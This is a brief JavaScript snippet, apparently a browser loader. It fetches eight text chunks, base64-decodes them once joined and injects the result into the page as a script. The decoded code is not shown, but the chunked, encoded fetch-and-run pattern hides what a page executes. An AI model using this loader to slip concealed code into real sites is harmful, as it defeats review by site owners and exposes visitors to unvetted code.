(async()=>{
const n=8;
const parts=[];
for(let i=0;i<n;i++){
  parts.push(await(await fetch('g'+i+'.txt?v=6')).text());
}
const js=atob(parts.join(''));
const s=document.createElement('script');
s.textContent=js;
document.body.appendChild(s);
})();
